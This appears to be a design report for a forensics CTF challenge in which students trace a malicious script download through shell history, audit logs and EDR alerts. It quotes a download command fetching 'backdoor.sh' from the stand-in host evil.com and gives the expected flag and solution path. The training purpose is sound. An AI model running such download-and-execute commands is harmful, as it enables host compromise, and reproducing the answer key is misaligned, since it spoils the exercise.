# M2-10 Real-World Artifact Upgrade Report

## Step 1 - Current Challenge Understanding

### Security Concept
- Post-compromise shell-forensics investigation focused on malicious script delivery chain.
- Task target: identify the command used to download the malicious script.

### Learning Outcome
- Correlate shell history with process audit, network egress, file timeline, and endpoint alerts.
- Distinguish routine admin shell usage from attacker command sequence.
- Extract the exact download command class from noisy DFIR evidence.

### Previous Artifact Weaknesses
- Tiny single-file history artifact with direct answer visibility.
- No correlation with process/network/EDR timeline.
- Low realism and minimal investigative depth.

## Step 2 - Real-World Artifact Investigation

Reference sources used:

1. MITRE ATT&CK - Ingress Tool Transfer and Command/Scripting behaviors:  
   https://attack.mitre.org/techniques/T1105/  
   https://attack.mitre.org/techniques/T1059/
2. NIST SP 800-61 incident handling and forensic evidence correlation:  
   https://csrc.nist.gov/pubs/sp/800/61/r2/final
3. Linux host triage practices: shell history + `auditd` + file execution timeline + EDR process alerts.

### Key Signals Adopted
- Shell history contains `wget http://evil.com/backdoor.sh -O /tmp/.cache/backdoor.sh`.
- Process exec audit confirms `/usr/bin/wget` invocation and immediate script execution chain.
- Network egress shows outbound transfer to `evil.com`.
- EDR and SIEM both classify the chain as suspicious download-and-execute behavior.

## Step 3 - Artifact Design Upgrade

Upgraded pack includes:
- `bash_history.log` (**8,405 lines**) recovered shell command stream.
- `process_exec_audit.log` (**6,203 lines**) host execution telemetry.
- `egress_connections.csv` (**5,603 lines**) network evidence.
- `file_mod_timeline.csv` (**4,304 lines**) file lifecycle reconstruction.
- `edr_command_alerts.jsonl` (**3,902 lines**) endpoint detections.
- `timeline_events.csv` (**4,805 lines**) SIEM sequence.
- `command_hardening_policy.txt` (**4 lines**) policy context.
- Briefing files.

Realism upgrades:
- Multi-source host + network + security telemetry.
- High baseline noise with a concise malicious chain hidden within.
- Practical DFIR-style pivot path instead of one-line answer extraction.

## Step 4 - Flag Engineering

Expected investigation path:
1. Read incident scope and time window.
2. Find suspicious download sequence in shell history.
3. Confirm command execution and arguments in process audit.
4. Confirm corresponding network connection and file create/execute events.
5. Validate EDR/SIEM detection context.
6. Return the download command.

Expected answer:
- `CTF{wget}`

## Step 5 - Generated Artifact Pack

Output ZIP:
- `backend/artifacts/m2/m2-10-shell-history-review.zip`

## Step 6 - Instructor Notes (Summary)

Suggested tools:
- `rg` pivots: `wget`, `backdoor.sh`, `evil.com`, `script_download`.
- Timeline reconstruction across shell/process/file/network datasets.
- `jq` filtering for high/critical EDR alerts.
